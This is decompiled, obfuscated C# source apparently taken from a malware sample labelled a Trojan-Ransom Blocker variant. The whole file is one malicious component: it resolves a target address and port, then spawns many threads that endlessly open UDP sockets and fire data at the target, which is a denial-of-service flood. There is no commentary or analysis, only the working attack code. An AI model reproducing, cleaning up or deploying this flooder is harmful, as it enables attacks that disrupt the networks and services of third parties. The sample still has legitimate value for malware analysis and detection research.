// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=fd817c43b15ff087
// MVID: 938B136E-48BF-4DCD-AB67-75445D7A7E89
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00035-msil\Trojan-Ransom.Win32.Blocker.vmi-39a6727ff649a9d06d3aabaaecc192cc5d4ffb806da8f5bafb80236d59f12d61.exe.exe

using \u0004;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0004
{
  internal class \u0002
  {
    private static ThreadStart[] \u0001;
    private static Thread[] \u0001;
    public static string \u0001;
    private static IPEndPoint \u0001;
    public static ushort \u0001;
    public static int \u0001;
    private static \u0002.\u0001[] \u0001;
    public static int \u0002;
    public static int \u0003;

    public static void \u0002()
    {
      try
      {
        \u0002.\u0001 = new IPEndPoint(\u0095.\u007E\u0001\u0004((object) \u0016\u0003.\u0094\u0003(\u0002.\u0001))[0], (int) \u0002.\u0001);
      }
      catch
      {
        \u0002.\u0001 = new IPEndPoint(\u001F\u0003.\u009E\u0003(\u0002.\u0001), (int) \u0002.\u0001);
      }
      \u0002.\u0001 = new Thread[\u0002.\u0002];
      \u0002.\u0001 = new ThreadStart[\u0002.\u0002];
      \u0002.\u0001 = new \u0002.\u0001[\u0002.\u0002];
      for (int index = 0; index < \u0002.\u0002; ++index)
      {
        \u0002.\u0001[index] = new \u0002.\u0001(\u0002.\u0001, \u0002.\u0003, \u0002.\u0001);
        \u0002.\u0001[index] = new ThreadStart(\u0002.\u0001[index].\u0002);
        \u0002.\u0001[index] = new Thread(\u0002.\u0001[index]);
        \u000E\u0002.\u007E\u001C\u0002((object) \u0002.\u0001[index]);
      }
    }

    public static void \u0003()
    {
      for (int index = 0; index < \u0002.\u0002; ++index)
      {
        try
        {
          \u000E\u0002.\u007E\u001E\u0002((object) \u0002.\u0001[index]);
        }
        catch
        {
        }
      }
    }

    private class \u0001
    {
      private IPEndPoint \u0001;
      private int \u0001;
      private Socket[] \u0001;
      private int \u0002;

      public \u0001([In] IPEndPoint obj0, [In] int obj1, [In] int obj2)
      {
        this.\u0001 = obj0;
        this.\u0002 = obj1;
        this.\u0001 = obj2;
      }

      public void \u0002()
      {
        while (true)
        {
          byte[] numArray = new byte[this.\u0001];
          try
          {
            this.\u0001 = new Socket[this.\u0002];
            for (int index = 0; index < this.\u0002; ++index)
            {
              this.\u0001[index] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
              \u0098.\u007E\u0007\u0004((object) this.\u0001[index], false);
              int num = \u0013\u0002.\u007E\u000F\u0004((object) this.\u0001[index], numArray, (EndPoint) this.\u0001);
            }
            \u000F\u0002.\u001F\u0002(100);
            for (int index = 0; index < this.\u0002; ++index)
            {
              if (\u0094.\u007E\u0008\u0004((object) this.\u0001[index]))
                \u0098.\u007E\u0011\u0004((object) this.\u0001[index], false);
              \u000E\u0002.\u007E\u000E\u0004((object) this.\u0001[index]);
              this.\u0001[index] = (Socket) null;
            }
            this.\u0001 = (Socket[]) null;
          }
          catch
          {
            for (int index = 0; index < this.\u0002; ++index)
            {
              try
              {
                if (\u0094.\u007E\u0008\u0004((object) this.\u0001[index]))
                  \u0098.\u007E\u0011\u0004((object) this.\u0001[index], false);
                \u000E\u0002.\u007E\u000E\u0004((object) this.\u0001[index]);
                this.\u0001[index] = (Socket) null;
              }
              catch
              {
              }
            }
          }
        }
      }
    }
  }
}
